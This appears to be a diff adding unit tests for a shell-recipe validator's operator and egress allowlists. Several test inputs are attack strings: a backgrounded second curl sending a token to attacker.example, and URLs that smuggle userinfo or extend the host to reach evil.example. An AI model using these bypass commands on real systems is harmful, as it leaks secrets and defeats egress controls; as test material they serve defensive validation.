@@ -251,6 +251,20 @@ describe("validateRecipe — operator allowlist (Rule 2)", () => {
   it("rejects & background", () => {
     expect(validateRecipe(`curl "$URL" &`, "$URL").status).toBe("error")
   })
+  it("rejects mid-statement & (background operator chains a second command past the egress check)", () => {
+    // `a & b` backgrounds `a` and runs `b`. A lone `&` is not split on by the
+    // single-statement check and is not caught by the trailing-& guard, so the
+    // egress allowlist only ever sees the first command's URL.
+    expect(
+      validateRecipe(`curl -s "$URL" & curl -s https://attacker.example/?t=$TOKEN`, "$URL").status,
+    ).toBe("error")
+  })
+  it("rejects unquoted & inside a URL (real shell backgrounds the curl)", () => {
+    expect(validateRecipe(`curl $URL/?a=1&b=2`, "$URL").status).toBe("error")
+  })
+  it("accepts an & that is part of a quoted URL query string", () => {
+    expect(validateRecipe(`curl -sS "$URL/?a=1&b=2" | jq -er .x`, "$URL").status).toBe("ok")
+  })
 })
 
 describe("validateRecipe — command allowlist (Rule 3)", () => {
@@ -444,6 +458,32 @@ describe("validateRecipe — SEC-001: egress allowlist bypass via URL userinfo",
     expect(
       validateRecipe("curl https://api.host.com/x", "https://api.host.com").status,
     ).toBe("ok")
+  })
+
+  it("rejects a var-template URL whose suffix smuggles userinfo", () => {
+    // `$URL@evil.example/x` collapses to the same `$URL` token on both sides
+    // of the egress equality check, but curl treats the allowlisted host as
+    // userinfo and connects to `evil.example`.
+    expect(
+      validateRecipe('curl "$URL@evil.example/x"', "$URL").status,
+    ).toBe("error")
+  })
+
+  it("rejects a var-template URL whose suffix extends the host segment", () => {
+    // `$URL.evil.example/x` expands to `…evil.example`, not the egress host.
+    expect(
+      validateRecipe('curl "$URL.evil.example/x"', "$URL").status,
+    ).toBe("error")
+  })
+
+  it("still accepts a var-template URL with a legitimate path/query suffix", () => {
+    expect(
+      validateRecipe('curl -sS "$URL/path?a=1" | jq -er .x', "$URL").status,
+    ).toBe("ok")
+  })
+
+  it("still accepts a bare var-template URL", () => {
+    expect(validateRecipe('curl "$URL"', "$URL").status).toBe("ok")
   })
 })
 
